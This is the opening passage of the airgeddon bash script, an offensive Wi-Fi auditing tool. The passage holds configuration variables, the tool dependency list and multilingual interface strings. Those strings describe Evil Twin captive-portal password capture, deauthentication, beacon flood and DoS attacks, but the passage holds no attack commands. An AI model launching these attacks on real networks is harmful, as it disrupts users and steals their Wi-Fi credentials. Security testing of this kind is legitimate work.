#!/bin/bash

airgeddon_version="4.1"

#Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
debug_mode=0

#Enabled 1 / Disabled 0 - Auto update feature (it has no effect on debug mode) - Default value 1
auto_update=1

#Enabled 1 / Disabled 0 - Auto change language feature - Default value 1
auto_change_language=1

#Language vars
#Change this line to select another default language. Select one from available values in array
language="english"
declare -A lang_association=(
								["en"]="english"
								["es"]="spanish"
								["fr"]="french"
								["ca"]="catalan"
								["pt"]="portuguese"
							)

#Repository and contact vars
github_user="v1s1t0r1sh3r3"
github_repository="airgeddon"
branch="master"
script_filename="airgeddon.sh"
urlgithub="https://github.com/$github_user/$github_repository"
urlscript_directlink="https://raw.githubusercontent.com/$github_user/$github_repository/$branch/$script_filename"
host_to_check_internet="github.com"
mail="v1s1t0r.1s.h3r3@gmail.com"
author="v1s1t0r"

#Tools vars
essential_tools_names=(
						"iwconfig"
						"iw"
						"awk"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
					)

optional_tools_names=(
						"wpaclean"
						"crunch"
						"aireplay-ng"
						"mdk3"
						"hashcat"
						"hostapd"
						"dhcpd"
						"iptables"
						"ettercap"
						"etterlog"
					)

declare -A optional_tools=(
							[${optional_tools_names[0]}]=0
							[${optional_tools_names[1]}]=0
							[${optional_tools_names[2]}]=0
							[${optional_tools_names[3]}]=0
							[${optional_tools_names[4]}]=0
							[${optional_tools_names[5]}]=0
							[${optional_tools_names[6]}]=0
							[${optional_tools_names[7]}]=0
							[${optional_tools_names[8]}]=0
							[${optional_tools_names[9]}]=0
						)

update_tools=("curl")

declare -A possible_package_names=(
									[${essential_tools_names[0]}]="wireless-tools" #iwconfig
									[${essential_tools_names[1]}]="iw" #iw
									[${essential_tools_names[2]}]="awk" #awk
									[${essential_tools_names[3]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[4]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[5]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[6]}]="xterm" #xterm
									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
									[${optional_tools_names[1]}]="crunch" #crunch
									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
									[${optional_tools_names[3]}]="mdk3" #mdk3
									[${optional_tools_names[4]}]="hashcat" #hashcat
									[${optional_tools_names[5]}]="hostapd" #hostapd
									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
									[${optional_tools_names[7]}]="iptables" #iptables
									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
									[${update_tools[0]}]="curl" #curl
								)

#General vars
standardhandshake_filename="handshake-01.cap"
tmpdir="/tmp/"
osversionfile_dir="/etc/"
minimum_bash_version_required="4.0"
resume_message=224
abort_question=12
pending_of_translation="[PoT]"
escaped_pending_of_translation="\[PoT\]"
standard_resolution="1024x768"

#Dhcpd and Hostapd vars
ip_range="192.168.1.0"
alt_ip_range="172.16.250.0"
router_ip="192.168.1.1"
alt_router_ip="172.16.250.1"
broadcast_ip="192.168.1.255"
alt_broadcast_ip="172.16.250.255"
range_start="192.168.1.33"
range_stop="192.168.1.100"
alt_range_start="172.16.250.33"
alt_range_stop="172.16.250.100"
std_c_mask="255.255.255.0"
ip_mask="255.255.255.255"
dhcpd_file="ag.dhcpd.conf"
dns1="8.8.8.8"
dns2="8.8.4.4"
hostapd_file="ag.hostapd.conf"
control_file="ag.control.sh"
possible_dhcp_leases_files=(
							"/var/lib/dhcp/dhcpd.leases"
							"/var/state/dhcp/dhcpd.leases"
							"/var/lib/dhcpd/dhcpd.leases"
						)

#Distros vars
known_compatible_distros=(
							"Wifislax"
							"Kali"
							"Kali arm"
							"Parrot"
							"Backbox"
							"Blackarch"
							"Cyborg"
							"Ubuntu"
							"Raspbian"
							"Debian"
							"SuSE"
							"CentOS"
							"Gentoo"
							"Fedora"
							"Red Hat"
							"Arch"
							"OpenMandriva"
						)

#Hint vars
declare main_hints=(128 134 163)
declare dos_hints=(129 131 133)
declare handshake_hints=(127 130 132 136)
declare handshake_attack_hints=(142)
declare decrypt_hints=(171 178 179 208 244)
declare select_interface_hints=(246)
declare language_hints=(250)
declare evil_twin_hints=(254 258 264 269 286)
declare evil_twin_dos_hints=(267 268)

#Charset vars
crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
crunch_numbercharset="0123456789"
crunch_symbolcharset="!#$%/=?{}[]-*:;"
hashcat_charsets=("?l" "?u" "?d" "?s")

#Colors vars
green_color="\033[1;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
normal_color="\e[1;0m"

function language_strings() {

	declare -A unknown_chipset
	unknown_chipset["english"]="Unknown"
	unknown_chipset["spanish"]="Desconocido"
	unknown_chipset["french"]="Inconnu"
	unknown_chipset["catalan"]="Desconegut"
	unknown_chipset["portuguese"]="Desconhecido"
	unknown_chipsetvar="${unknown_chipset["$language"]}"

	declare -A hintprefix
	hintprefix["english"]="Hint"
	hintprefix["spanish"]="Consejo"
	hintprefix["french"]="Conseil"
	hintprefix["catalan"]="Consell"
	hintprefix["portuguese"]="Conselho"
	hintvar="*"${hintprefix[$language]}"*"
	escaped_hintvar="\*"${hintprefix[$language]}"\*"

	declare -A optionaltool_needed
	optionaltool_needed["english"]="Locked option, it needs: "
	optionaltool_needed["spanish"]="Opción bloqueada, requiere: "
	optionaltool_needed["french"]="Option bloquée parce qu’il manque: "
	optionaltool_needed["catalan"]="Opció bloquejada, necessita: "
	optionaltool_needed["portuguese"]="Opção bloqueado requer :"

	declare -A under_construction
	under_construction["english"]="under construction"
	under_construction["spanish"]="en construcción"
	under_construction["french"]="en construction"
	under_construction["catalan"]="en construcció"
	under_construction["portuguese"]="em construção"
	under_constructionvar="${under_construction["$language"]}"

	declare -gA possible_package_names
	possible_package_names["english"]="Possible package name"
	possible_package_names["spanish"]="Posible nombre del paquete"
	possible_package_names["french"]="Possible nom du paquet"
	possible_package_names["catalan"]="Possible nom del paquet"
	possible_package_names["portuguese"]="Possível nome do pacote"

	declare -gA et_misc_texts
	et_misc_texts["english",0]="Evil Twin AP Info"
	et_misc_texts["spanish",0]="Info Evil Twin AP"
	et_misc_texts["french",0]="Info Evil Twin AP"
	et_misc_texts["catalan",0]="Info Evil Twin AP"
	et_misc_texts["portuguese",0]="Info Evil Twin AP"

	et_misc_texts["english",1]="Channel"
	et_misc_texts["spanish",1]="Canal"
	et_misc_texts["french",1]="Canal"
	et_misc_texts["catalan",1]="Canal"
	et_misc_texts["portuguese",1]="Canal"

	et_misc_texts["english",2]="Online time"
	et_misc_texts["spanish",2]="Tiempo online"
	et_misc_texts["french",2]="Temps en ligne"
	et_misc_texts["catalan",2]="Temps online"
	et_misc_texts["portuguese",2]="Tempo online"

	et_misc_texts["english",3]="DHCP ips given to possible connected clients"
	et_misc_texts["spanish",3]="Ips entregadas por DHCP a posibles clientes conectados"
	et_misc_texts["french",3]="Ips attribuées à d'éventuels clients DHCP"
	et_misc_texts["catalan",3]="Ips lliurades per DHCP a possibles clients connectats"
	et_misc_texts["portuguese",3]="Ips entregues pelos clientes DHCP ligado ao possível"

	et_misc_texts["english",4]="With this attack you have to use an external sniffer to try to obtain client passwords connected to the network"
	et_misc_texts["spanish",4]="Con este ataque has de usar un sniffer externo para intentar obtener contraseñas de los clientes conectados a la red"
	et_misc_texts["french",4]="Avec cette attaque, vous devez utiliser un sniffeur pour tenter d'obtenir les mots de passe des clients connectés au réseau"
	et_misc_texts["catalan",4]="Amb aquest atac has d'utilitzar un sniffer extern per intentar obtenir contrasenyes dels clients connectats a la xarxa"
	et_misc_texts["portuguese",4]="Com este ataque você tem que usar um sniffer externa para tentar obter as senhas dos clientes conectados à rede"

	et_misc_texts["english",5]="With this attack, watch the sniffer's screen to see if a password appears"
	et_misc_texts["spanish",5]="Con este ataque, estate atento a la pantalla del sniffer para ver si aparece alguna contraseña"
	et_misc_texts["french",5]="Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé"
	et_misc_texts["catalan",5]="Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya"
	et_misc_texts["portuguese",5]="Com este ataque, cuidado com a tela aparece sniffer para ver se uma senha"

	et_misc_texts["english",6]="With this attack, we'll wait for a network client to provide us with the password for the wifi network in our captive portal"
	et_misc_texts["spanish",6]="Con este ataque, esperaremos a que un cliente de la red nos provea de la contraseña de la red wifi en nuestro portal cautivo"
	et_misc_texts["french",6]="Avec cette attaque nous allons attendre qu'un client rentre le mot de passe du réseau cible dans notre portail captif"
	et_misc_texts["catalan",6]="Amb aquest atac, esperarem que un client de la xarxa ens proveeixi de la contrasenya de la xarxa wifi al nostre portal captiu"
	et_misc_texts["portuguese",6]="Com este ataque, vamos esperar por um cliente de rede nos fornecer a senha para a rede wifi no nosso portal cativo"

	et_misc_texts["english",7]="No clients connected yet"
	et_misc_texts["spanish",7]="No hay clientes conectados aún"
	et_misc_texts["french",7]="Toujours pas de clients connectés"
	et_misc_texts["catalan",7]="Encara no hi han clients connectats"
	et_misc_texts["portuguese",7]="Ainda não há clientes conectados"

	et_misc_texts["english",8]="Airgeddon. Evil Twin attack captured passwords"
	et_misc_texts["spanish",8]="Airgeddon. Contraseñas capturadas en ataque Evil Twin"
	et_misc_texts["french",8]="Airgeddon. Mots de passe capturés par attaque Evil Twin"
	et_misc_texts["catalan",8]="Airgeddon. Contrasenyes capturades amb atac Evil Twin"
	et_misc_texts["portuguese",8]="Airgeddon. Senhas capturado no ataque ataque Evil Twin"

	declare -A arr
	arr["english",0]="This interface $interface is already in managed mode"
	arr["spanish",0]="Esta interfaz $interface ya está en modo managed"
	arr["french",0]="L'interface $interface est déjà en mode managed"
	arr["catalan",0]="Aquesta interfície $interface ja està en mode managed"
	arr["portuguese",0]="$pending_of_translation Este interface $interface já está em modo managed"

	arr["english",1]="This interface $interface is not a wifi card. It doesn't support managed mode"
	arr["spanish",1]="Esta interfaz $interface no es una tarjeta wifi. No soporta modo managed"
	arr["french",1]="L'interface $interface n'est pas une carte wifi. Elle n'est donc pas compatible mode managed"
	arr["catalan",1]="Aquesta interfície $interface no és una targeta wifi vàlida. No es compatible amb mode managed"
	arr["portuguese",1]="$pending_of_translation Este interface $interface não é um cartão de wifi. Ele não suporta o modo managed"

	arr["english",2]="English O.S. language detected. Supported by script. Automatically changed"
	arr["spanish",2]="Idioma Español del S.O. detectado. Soportado por el script. Se cambió automaticamente"
	arr["french",2]="S.E. en Français détecté. Langue prise en charge par le script et changé automatiquement"
	arr["catalan",2]="Idioma Català del S.O. detectat. Suportat pel script. S'ha canviat automàticament"
	arr["portuguese",2]="$pending_of_translation Portugues do S.O. detectado. Compatível com o script. Ele é automaticamente alterada"

	arr["english",3]="Select target network :"
	arr["spanish",3]="Selecciona la red objetivo :"
	arr["french",3]="Sélectionnez le réseau cible :"
	arr["catalan",3]="Selecciona la xarxa objectiu :"
	arr["portuguese",3]="$pending_of_translation Seleccione a rede de destino :"

	arr["english",4]="Press [Enter] key to start attack..."
	arr["spanish",4]="Pulse la tecla [Enter] para comenzar el ataque..."
	arr["french",4]="Pressez [Enter] pour commencer l'attaque..."
	arr["catalan",4]="Premi la tecla [Enter] per començar l'atac..."
	arr["portuguese",4]="$pending_of_translation Pressione [Enter] para iniciar o ataque..."

	arr["english",5]="It looks like your internet connection is unstable. The script can't connect to repository. It will continue without updating..."
	arr["spanish",5]="Parece que tu conexión a internet no es estable. El script no puede conectar al repositorio. Continuará sin actualizarse..."
	arr["french",5]="Votre connexion internet est trop médiocre pour pouvoir se connecter aux dépôts comme ils se doit. Le script va s’exécuter sans s'actualiser..."
	arr["catalan",5]="Sembla que la teva connexió a internet no és estable. El script no pot connectar amb el repositori. Continuarà sense actualitzar-se..."
	arr["portuguese",5]="$pending_of_translation Parece que sua conexão com a internet não é estável. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."

	arr["english",6]="Welcome to airgeddon script v$airgeddon_version"
	arr["spanish",6]="Bienvenid@ a airgeddon script v$airgeddon_version"
	arr["french",6]="Bienvenue au script airgeddon v$airgeddon_version"
	arr["catalan",6]="Benvingut a airgeddon script v$airgeddon_version"
	arr["portuguese",6]="$pending_of_translation Bem-vindo ao script airgeddon v$airgeddon_version"

	arr["english",7]="This script is only for educational purposes. Be good boyz&girlz!"
	arr["spanish",7]="Este script se ha hecho sólo con fines educativos. Sed buen@s chic@s!"
	arr["french",7]="Ce script a été fait à des fins purement éducatives. Portez-vous biens!"
	arr["catalan",7]="Aquest script s'ha fet només amb fins educatius. Porteu-vos bé!"
	arr["portuguese",7]="$pending_of_translation Este script foi feito apenas para fins educacionais. Comportem-se!"

	arr["english",8]="Known compatible distros with this script :"
	arr["spanish",8]="Distros conocidas compatibles con este script :"
	arr["french",8]="Distros connus compatibles avec ce script :"
	arr["catalan",8]="Distros conegudes compatibles amb aquest script :"
	arr["portuguese",8]="$pending_of_translation Distros conhecidas compatíveis com este script :"

	arr["english",9]="Detecting system..."
	arr["spanish",9]="Detectando sistema..."
	arr["french",9]="Détection du système..."
	arr["catalan",9]="Detecció del sistema..."
	arr["portuguese",9]="$pending_of_translation Sistema de detecção de..."

	arr["english",10]="This interface $interface is already in monitor mode"
	arr["spanish",10]="Esta interfaz $interface ya está en modo monitor"
	arr["french",10]="L'interface $interface est déjà en mode moniteur"
	arr["catalan",10]="Aquesta interfície ja està en mode monitor"
	arr["portuguese",10]="$pending_of_translation Este $interface de interface já está em modo monitor"

	arr["english",11]="Exiting airgeddon script v$airgeddon_version - See you soon! :)"
	arr["spanish",11]="Saliendo de airgeddon script v$airgeddon_version - Nos vemos pronto! :)"
	arr["french",11]="Fermeture du script airgeddon v$airgeddon_version - A bientôt! :)"
	arr["catalan",11]="Sortint de airgeddon script v$airgeddon_version - Ens veiem aviat! :)"
	arr["portuguese",11]="$pending_of_translation Deixando airgeddon script v$airgeddon_version - Até breve! :)"

	arr["english",12]=${blue_color}"Interruption detected. "${green_color}"Do you really want to exit? "${normal_color}"[y/n]"
	arr["spanish",12]=${blue_color}"Detectada interrupción. "${green_color}"¿Quieres realmente salir del script? "${normal_color}"[y/n]"
	arr["french",12]=${blue_color}"Interruption détectée. "${green_color}"Voulez-vous vraiment arrêter le script? "${normal_color}"[y/n]"
	arr["catalan",12]=${blue_color}"Interrupció detectada. "${green_color}"¿Realment vols sortir de l'script? "${normal_color}"[y/n]"
	arr["portuguese",12]="$pending_of_translation "${blue_color}"Interrupção detectado. "${green_color}"Você quer realmente obter o script? "${normal_color}"[y/n]"

	arr["english",13]="This interface $interface is not a wifi card. It doesn't support monitor mode"
	arr["spanish",13]="Esta interfaz $interface no es una tarjeta wifi. No soporta modo monitor"
	arr["french",13]="L'interface $interface n'est pas une carte wifi. Elle n'est donc pas compatible mode moniteur"
	arr["catalan",13]="Aquesta interfície $interface no és una targeta wifi vàlida. No es compatible amb mode monitor"
	arr["portuguese",13]="$pending_of_translation Este interface $interface não é um cartão de wifi. Ele não suporta modo monitor"

	arr["english",14]="This interface $interface is not in monitor mode"
	arr["spanish",14]="Esta interfaz $interface no está en modo monitor"
	arr["french",14]="L'interface $interface n'est pas en mode moniteur"
	arr["catalan",14]="Aquesta interfície $interface no està en mode monitor"
	arr["portuguese",14]="$pending_of_translation Este interface $interface não está em modo monitor"

	arr["english",15]="The interface changed its name while putting in managed mode. Autoselected"
	arr["spanish",15]="Esta interfaz ha cambiado su nombre al ponerlo en modo managed. Se ha seleccionado automáticamente"
	arr["french",15]="Le nom de l'interface a changé lors du passage en mode managed. Elle a été sélectionnée automatiquement"
	arr["catalan",15]="Aquesta interfície ha canviat de nom al posar-la en mode managed. S'ha triat automàticament"
	arr["portuguese",15]="$pending_of_translation Esta interface mudou seu nome, colocando-o em modo managed. Foi seleccionado automaticamente"

	arr["english",16]="Managed mode now is set on $interface"
	arr["spanish",16]="Se ha puesto el modo managed en $interface"
	arr["french",16]="$interface est maintenant en mode manged"
	arr["catalan",16]="$interface s'ha configurat en mode managed"
	arr["portuguese",16]="$pending_of_translation Modo managed $interface"

	arr["english",17]="Putting your interface in managed mode..."
	arr["spanish",17]="Poniendo la interfaz en modo managed..."
	arr["french",17]="L'interface est en train de passer en mode managed..."
	arr["catalan",17]="Configurant la interfície en mode managed..."
	arr["portuguese",17]="$pending_of_translation Colocar a interface em modo managed..."

	arr["english",18]="Putting your interface in monitor mode..."
	arr["spanish",18]="Poniendo la interfaz en modo monitor..."
	arr["french",18]="L'interface est en train de passer en mode moniteur..."
	arr["catalan",18]="Configurant la interfície en mode monitor..."
	arr["portuguese",18]="$pending_of_translation Colocar a interface em modo monitor..."

	arr["english",19]="Please be patient. Maybe killing some conflicting processes..."
	arr["spanish",19]="Por favor ten paciencia. Puede que esté matando algunos procesos que podrían causar conflicto..."
	arr["french",19]="Soyez patients s'il vous plaît. Il se peut qu'il faile tuer des processus conflictuels..."
	arr["catalan",19]="Si us plau té paciència. Pot ser que s'estiguin matant alguns processos que podrien causar conflicte..."
	arr["portuguese",19]="$pending_of_translation Por favor, seja paciente. Pode-se matar alguns processos que podem causar conflitos..."

	arr["english",20]="This interface $interface doesn't support monitor mode"
	arr["spanish",20]="Esta interfaz $interface no soporta modo monitor"
	arr["french",20]="L'interface $interface n'est pas compatible mode moniteur"
	arr["catalan",20]="Aquesta interfície $interface no suporta mode monitor"
	arr["portuguese",20]="$pending_of_translation Essa interface $interface não suporta o modo monitor"

	arr["english",21]="The interface changed its name while putting in monitor mode. Autoselected"
	arr["spanish",21]="Esta interfaz ha cambiado su nombre al ponerla en modo monitor. Se ha seleccionado automáticamente"
	arr["french",21]="Le nom de l'interface à changé lors de l'activation du mode moniteur. Elle a été automatiquement sélectionnée"
	arr["catalan",21]="Aquesta interfície ha canviat de nom al posar-la en mode monitor. S'ha seleccionat automàticament"
	arr["portuguese",21]="$pending_of_translation Esta interface mudou seu nome para colocar no modo monitor. Foi seleccionado automaticamente"

	arr["english",22]="Monitor mode now is set on $interface"
	arr["spanish",22]="Se ha puesto el modo monitor en $interface"
	arr["french",22]="Mode moniteur activé sur l'interface $interface"
	arr["catalan",22]="S'ha configurat el mode monitor en $interface"
	arr["portuguese",22]="$pending_of_translation Ele foi colocado em $interface do modo monitor"

	arr["english",23]="There is a problem with the interface selected. Redirecting you to script exit"
	arr["spanish",23]="Hay un problema con la interfaz seleccionada. Redirigiendo a la salida del script"
	arr["french",23]="Il y a un problème avec l'interface choisie. Vous allez être dirigés vers la sortie du script"
	arr["catalan",23]="Hi ha un problema amb la interfície seleccionada. Redirigint cap a la sortida del script"
	arr["portuguese",23]="$pending_of_translation Existe um problema com o interface seleccionado. Redirecionando a saída do script"

	arr["english",24]="Select an interface to work with :"
	arr["spanish",24]="Selecciona una interfaz para trabajar con ella :"
	arr["french",24]="Sélectionnez l'interface pour travailler :"
	arr["catalan",24]="Seleccionar una interfície per treballar-hi :"
	arr["portuguese",24]="$pending_of_translation Seleccionar uma interface para trabalhar com :"

	arr["english",25]="Set channel (1-14) :"
	arr["spanish",25]="Selecciona un canal (1-14) :"
	arr["french",25]="Sélectionnez un canal (1-14) :"
	arr["catalan",25]="Seleccioni un canal (1-14) :"
	arr["portuguese",25]="$pending_of_translation Escolha um canal (1-14) :"

	arr["english",26]="Channel set to "${normal_color}"$channel"
	arr["spanish",26]="Canal elegido "${normal_color}"$channel"
	arr["french",26]="Le canal "${normal_color}"$channel"${blue_color}" a été choisi"
	arr["catalan",26]="El canal "${normal_color}"$channel"${blue_color}" s'ha escollit"
	arr["portuguese",26]="$pending_of_translation Canal "${normal_color}"$channel"${blue_color}" selecionado"

	arr["english",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
	arr["spanish",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
	arr["french",27]="Veuillez entrer le BSSID de l'objectif (exemple: 00:11:22:33:44:55) :"
	arr["catalan",27]="Escriu el BSSID objectiu (exemple: 00:11:22:33:44:55) :"
	arr["portuguese",27]="$pending_of_translation Escreva o BSSID alvo (exemplo: 00:11:22:33:44:55) :"

	arr["english",28]="BSSID set to "${normal_color}"$bssid"
	arr["spanish",28]="BSSID elegido "${normal_color}"$bssid"
	arr["french",28]="Le BSSID choisi est "${normal_color}"$bssid"
	arr["catalan",28]="El BSSID escollit "${normal_color}"$bssid"
	arr["portuguese",28]="$pending_of_translation BSSID escolhida "${normal_color}"$bssid"

	arr["english",29]="Type target ESSID :"
	arr["spanish",29]="Escribe el ESSID objetivo :"
	arr["french",29]="Écrivez l'ESSID du réseau cible :"
	arr["catalan",29]="Escriu el ESSID objectiu :"
	arr["portuguese",29]="$pending_of_translation Escreva o ESSID alvo :"

	arr["english",30]="You have selected a hidden network ESSID. Can't be used. Select another one or perform a BSSID based attack instead of this"
	arr["spanish",30]="Has seleccionado un ESSID de red oculta. No se puede usar. Selecciona otro o ejecuta un ataque basado en BSSID en lugar de este"
	arr["french",30]="Vous avez choisi un réseau dont l'ESSID est caché et ce n'est pas possible. Veuillez sélectionner une autre cible ou bien effectuer une attaque qui se fonde sur le BSSID au lieu de celle-ci"
	arr["catalan",30]="Has seleccionat un ESSID de xarxa oculta. No es pot utilitzar. Selecciona un altre o executa un atac basat en BSSID en lloc d'aquest"
	arr["portuguese",30]="$pending_of_translation Você selecionou uma rede ESSID oculto. Você não pode usar. Selecione outro ou executar um ataque com base BSSID ao invés desta"

	arr["english",31]="ESSID set to "${normal_color}"$essid"
	arr["spanish",31]="ESSID elegido "${normal_color}"$essid"
	arr["french",31]="l'ESSID sélectionné est "${normal_color}"$essid"
	arr["catalan",31]="l'ESSID seleccionat "${normal_color}"$essid"
	arr["portuguese",31]="$pending_of_translation ESSID escolhido "${normal_color}"$essid"

	arr["english",32]="All parameters set"
	arr["spanish",32]="Todos los parámetros están listos"
	arr["french",32]="Tous les paramètres sont correctement établis"
	arr["catalan",32]="Tots els paràmetres establerts"
	arr["portuguese",32]="$pending_of_translation Todos os parâmetros estão prontos"

	arr["english",33]="Starting attack. When started, press Ctrl+C to stop..."
	arr["spanish",33]="Comenzando ataque. Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",33]="L'attaque est lancé. Pressez Ctrl+C pour l'arrêter..."
	arr["catalan",33]="Començant l'atac. Un cop començat, premeu Ctrl+C per aturar-lo..."
	arr["portuguese",33]="$pending_of_translation Começando ataque. Uma vez iniciado, pressione Ctrl+C para pará-lo..."

	arr["english",34]="Selected interface $interface is in monitor mode. Attack can be performed"
	arr["spanish",34]="La interfaz seleccionado $interface está en modo monitor. El ataque se puede realizar"
	arr["french",34]="L'interface $interface qui a été sélectionnée est bien en mode moniteur. L'attaque peut être lancée"
	arr["catalan",34]="La interfície seleccionada $interface està configurada en mode monitor. L'atac es pot realitzar"
	arr["portuguese",34]="$pending_of_translation Os $interface de interface selecionada está no modo monitor. O ataque pode ser realizada"

	arr["english",35]="Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
	arr["spanish",35]="Elegido ataque de Desautenticación / Desasociación mdk3 (modo monitor requerido)"
	arr["french",35]="L'attaque de Dés-authentification / Dissociation mdk3 a été choisie (mode moniteur nécessaire)"
	arr["catalan",35]="Seleccionat atac de Desautenticació / Dissociació mdk3 (es requereix mode monitor)"
	arr["portuguese",35]="$pending_of_translation Eleito deauth ataque / Separar mdk3 (modo monitor obrigatório)"

	arr["english",36]="Deauthentication aireplay attack chosen (monitor mode needed)"
	arr["spanish",36]="Elegido ataque de Desautenticación aireplay (modo monitor requerido)"
	arr["french",36]="L'attaque de Dés-authentification aireplay a été choisie (mode moniteur nécessaire)"
	arr["catalan",36]="Seleccionat atac de Desautenticació aireplay (es requereix mode monitor)"
	arr["portuguese",36]="$pending_of_translation Aireplay eleito ataque deauth (modo monitor obrigatório)"

	arr["english",37]="WIDS / WIPS / WDS Confusion attack chosen (monitor mode needed)"
	arr["spanish",37]="Elegido ataque Confusion WIDS / WIPS / WDS (modo monitor requerido)"
	arr["french",37]="L'attaque Confusion WIDS / WIPS / WDS a été choisie (mode moniteur nécessaire)"
	arr["catalan",37]="Seleccionat atac Confusion WIDS /WIPS / WDS (es requereix mode monitor)"
	arr["portuguese",37]="$pending_of_translation Confusão eleito ataque WIDS / WIPS / WDS (modo monitor obrigatório)"

	arr["english",38]="Beacon flood attack chosen (monitor mode needed)"
	arr["spanish",38]="Elegido ataque Beacon flood (modo monitor requerido)"
	arr["french",38]="L'attaque Beacon flood a été choisie (mode moniteur nécessaire)"
	arr["catalan",38]="Seleccionat atac Beacon flood (es requereix mode monitor)"
	arr["portuguese",38]="$pending_of_translation Eleito ataque de Beacon flood (modo monitor obrigatório)"

	arr["english",39]="Auth DoS attack chosen (monitor mode needed)"
	arr["spanish",39]="Elegido ataque Auth DoS (modo monitor requerido)"
	arr["french",39]="L'attaque Auth DoS a été choisie (modo moniteur nécessaire)"
	arr["catalan",39]="Seleccionat atac Auth DoS (es requereix mode monitor)"
	arr["portuguese",39]="$pending_of_translation Auth escolhido ataque DoS (modo monitor obrigatório)"

	arr["english",40]="Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
	arr["spanish",40]="Elegido ataque Michael Shutdown (TKIP) (modo monitor requerido)"
	arr["french",40]="L'attaque Michael Shutdown (TKIP) a été choisie (mode moniteur nécessaire)"
	arr["catalan",40]="Seleccionat atac Michael Shutdown (TKIP) (es requereix mode monitor)"
	arr["portuguese",40]="$pending_of_translation Ataque eleito Michael Shutdown (TKIP) (modo monitor obrigatório)"

	arr["english",41]="No interface selected. You'll be redirected to select one"
	arr["spanish",41]="No hay interfaz seleccionada. Serás redirigido para seleccionar una"
	arr["french",41]="Aucune interface sélectionnée. Vous allez retourner au menu de sélection pour en choisir une"
	arr["catalan",41]="No hi ha intefície seleccionada. Seràs redirigit per seleccionar una"
	arr["portuguese",41]="$pending_of_translation Sem interface selecionada. Você será redirecionado para selecionar um"

	arr["english",42]="Interface "${pink_color}"$interface"${blue_color}" selected. Mode: "${pink_color}"$ifacemode"${normal_color}
	arr["spanish",42]="Interfaz "${pink_color}"$interface"${blue_color}" seleccionada. Modo: "${pink_color}"$ifacemode"${normal_color}
	arr["french",42]="Interface "${pink_color}"$interface"${blue_color}" sélectionnée. Mode: "${pink_color}"$ifacemode"${normal_color}
	arr["catalan",42]="Interfície "${pink_color}"$interface"${blue_color}" seleccionada. Mode: "${pink_color}"$ifacemode"${normal_color}
	arr["portuguese",42]="$pending_of_translation Interface "${pink_color}"$interface"${blue_color}" selecionado. Modo: "${pink_color}"$ifacemode"${normal_color}

	arr["english",43]="Selected BSSID: "${pink_color}"$bssid"${normal_color}
	arr["spanish",43]="BSSID seleccionado: "${pink_color}"$bssid"${normal_color}
	arr["french",43]="BSSID sélectionné: "${pink_color}"$bssid"${normal_color}
	arr["catalan",43]="BSSID seleccionat: "${pink_color}"$bssid"${normal_color}
	arr["portuguese",43]="$pending_of_translation BSSID selecionado: "${pink_color}"$bssid"${normal_color}

	arr["english",44]="Selected channel: "${pink_color}"$channel"${normal_color}
	arr["spanish",44]="Canal seleccionado: "${pink_color}"$channel"${normal_color}
	arr["french",44]="Canal sélectionné: "${pink_color}"$channel"${normal_color}
	arr["catalan",44]="Canal seleecionat: "${pink_color}"$channel"${normal_color}
	arr["portuguese",44]="$pending_of_translation Canal selecionado: "${pink_color}"$channel"${normal_color}

	arr["english",45]="Selected ESSID: "${pink_color}"$essid"${blue_color}" <- can't be used"
	arr["spanish",45]="ESSID seleccionado: "${pink_color}"$essid"${blue_color}" <- no se puede usar"
	arr["french",45]="ESSID sélectionné: "${pink_color}"$essid"${blue_color}" <- ne peut pas être utilisé"
	arr["catalan",45]="ESSID seleccionat: "${pink_color}"$essid"${blue_color}" <- no es pot utilitzar"
	arr["portuguese",45]="$pending_of_translation ESSID seleccionado: "${pink_color}"$essid"${blue_color}" <- não pode ser utilizada"

	arr["english",46]="Selected ESSID: "${pink_color}"$essid"${normal_color}
	arr["spanish",46]="ESSID seleccionado: "${pink_color}"$essid"${normal_color}
	arr["french",46]="ESSID sélectionné: "${pink_color}"$essid"${normal_color}
	arr["catalan",46]="ESSID seleccionat: "${pink_color}"$essid"${normal_color}
	arr["portuguese",46]="$pending_of_translation ESSID selecionado: "${pink_color}"$essid"${normal_color}

	arr["english",47]="Select an option from menu :"
	arr["spanish",47]="Selecciona una opción del menú :"
	arr["french",47]="Choisissez une des options du menu :"
	arr["catalan",47]="Selecciona una opció del menú :"
	arr["portuguese",47]="$pending_of_translation Selecione uma opção de menu :"

	arr["english",48]="1.  Select another network interface"
	arr["spanish",48]="1.  Selecciona otra interfaz de red"
	arr["french",48]="1.  Sélectionnez une autre interface réseaux"
	arr["catalan",48]="1.  Selecciona una altre interfície de xarxa"
	arr["portuguese",48]="$pending_of_translation 1.  Selecione outra interface de rede"


	arr["english",49]="4.  Explore for targets (monitor mode needed)"
	arr["spanish",49]="4.  Explorar para buscar objetivos (modo monitor requerido)"
	arr["french",49]="4.  Détection des réseaux pour choisir une cible (modo moniteur obligatoire)"
	arr["catalan",49]="4.  Explorar per buscar objectius (es requereix mode monitor)"
	arr["portuguese",49]="$pending_of_translation 4.  Procurar para procurar objetivos (modo monitor obrigatório)"

	arr["english",50]="monitor mode needed for attacks"
	arr["spanish",50]="modo monitor requerido en ataques"
	arr["french",50]="modo moniteur obligatoire pour ces attaques"
